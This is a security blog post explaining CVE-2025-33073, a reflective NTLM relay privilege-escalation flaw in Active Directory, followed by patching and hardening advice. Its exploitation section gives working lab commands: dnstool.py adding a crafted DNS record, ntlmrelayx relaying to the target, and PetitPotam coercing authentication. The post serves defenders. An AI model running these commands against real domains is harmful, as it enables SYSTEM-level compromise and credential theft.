---
title: "CVE-2025-33073: A New Technique for Reflective NTLM Relay Attack"
date: 2025-06-12
categories: [Active Directory, Vulnerability]
tags: [Active Directory]
image:
  path: /assets/img/Active_Directory/Active Directory.png
---

## **Executive Summary**

On **10 June 2025**, Microsoft released a total of 66 different vulnerabilities **2 being zero-day** ones and patches to mitigate these vulnerabilities. One of the zero-day vulnerabilities is called CVE-2025-33073 Windows SMB Client Elevation of Privilege Vulnerability and allows an unauthorized user to **execute remote commands** and **privilege escalation** in **Active Directory Environment**.

## **Introduction**

Vulnerability id **CVE-2025-33073** is released by security researchers and allows the misuse of **default DNS permissions** in **Active Directory** infrastructure to gain control of the entire system.

**Every user in Active Directory** environment **has the privilege of creating new A entries in AD-integrated DNS service**.

By using this vulnerability, the attacker adds a special DNS entry. This DNS entry looks like a victim computer but contains the attacker’s IP address.

Subsequently, the attacker can trigger a **coercion** attack (such as **MS-RPRN/PrinterBug, MS-EFSR/PetitPotam, or MS-DFSNM/DFSCoerce**) to force the target server to perform an NTLM authentication to the computer that is compromised by attacker’s DNS entry.

If **SMB Signing** is **not enforced** on the server, the attacker can perform an **NTLM reflection** attack by reflecting the authentication session back to the same machine. This grants the attacker **NT AUTHORITYSYSTEM** privileges. With SYSTEM-level access, the attacker can gain password hashes from **SAM** or **LSASS**, execute commands and compromise the server and potentially the entire AD domain

With this vulnerability’s **NTLM relay attack**, the attacker reflects the authentication session back to the same machine. This attack vector can be implemented with any computer in the Active Directory environment therefore, the attacker can gain full privilege in the target domain.

With the **10 June 2025** patch, Microsoft patched this vulnerability. But in Active directory environments following precautions must be taken for extra protection.

● SBM Signing feature set to “Required”

● Eliminating coercion vulnerabilities such as MS-RPRN/PrinterBug, PetitPotam or DFSCoerce

● Removing DNS entry privileges for unauthorised users or groups like “Authenticated Users”

## **Exploitation**

**By default**, **Authenticated Users group** has privilege to create **DNS entries into several DNS zones** in Active Directory environment. With this, any user in Active Directory environment could create new DNS entries. In the first step of this exploit, by using this privilege; malicious DNS entry gets added to the system using [**dnstool.py**](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) tool in [**Krbrelayx**](https://github.com/dirkjanm/krbrelayx) Github repository. As seen here, first part of the value **srv011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA** contains target domain’s name. Instead of domain name, **localhost** expression can be used for this process.

(**localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA**)

```
# Domain Name 			hq.rd.forestall.labs
# Username				attacker
# Password				Test123.!
# DC IP Address			192.168.231.130
# DNS Hostname			srv011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
# DNS IP Address (Kali)	192.168.231.234 

python dnstool.py -u 'hq.rd.forestall.labs\attacker' -p Test123.! 192.168.231.130 -a add -r srv011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 192.168.231.234
```

![](/assets/img/reflective-ntlm-relay-attack/1.png)

Because the exploitation process is done with **NTLM Relay** attack, [**ntlmrelayx**](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) tool in [**Impacket**](https://github.com/fortra/impacket) needed to run with target domain passed as parameter.

```
# Target Server Name   srv01.hq.rd.forestall.labs

impacket-ntlmrelayx -t srv01.hq.rd.forestall.labs -smb2support 
```

A packet that is captured with the use of **coercion** vulnerability in the domain is routed to the server that the attacker took control of. With the use of **NTLM Relay** attack, the packet that is captured gets sent back to the same server (**reflection**). With this process, password hashes of users in the target server or execution of remote commands are achieved.

```
# Username					attacker
# Password					Test123.!
# Domain Name				hq.rd.forestall.labs
# DNS Hostname				srv011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
# Target Server Name		srv01.hq.rd.forestall.labs

python PetitPotam.py -u attacker -p Test123.! -d hq.rd.forestall.labs srv011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA srv01.hq.rd.forestall.labs 
```

![](/assets/img/reflective-ntlm-relay-attack/2.png)

![](/assets/img/reflective-ntlm-relay-attack/3.png)

## **Mitigation Steps**

1. In order to mitigate this vulnerability, patch that published by Microsoft for the vulnerability **CVE-2025-33073** must be installed to all servers and clients beginning from important ones (DC, CA, Exchange etc.).
2. In order to be protected from these types of vulnerabilities in general and not to be affected by the next zero-day vulnerability affecting these mechanisms, it is necessary to take precautions against other attack vectors used in vulnerability exploitation. For this purpose, all servers with active **Coercion** interfaces should be detected and step by step Coercion interfaces should be closed or restricted appropriately (**rpcfilter**).
3. Additionally, in order to prevent **NTLM Relay** attacks in general, servers that support **SMB Version 1** should first be identified and Version 1 support should be disabled. Then, the **SMB Signing** configuration should be **enabled** on all servers and clients, starting with important servers, and then made **enforced** step by step.
4. Finally, permissions to create entries for very large groups such as **Authenticated Users** should be **removed** from **DNS zones**.

## **References**

1. [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
2. [https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
3. [https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)
4. [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam)
5. [https://github.com/fortra/impacket](https://github.com/fortra/impacket)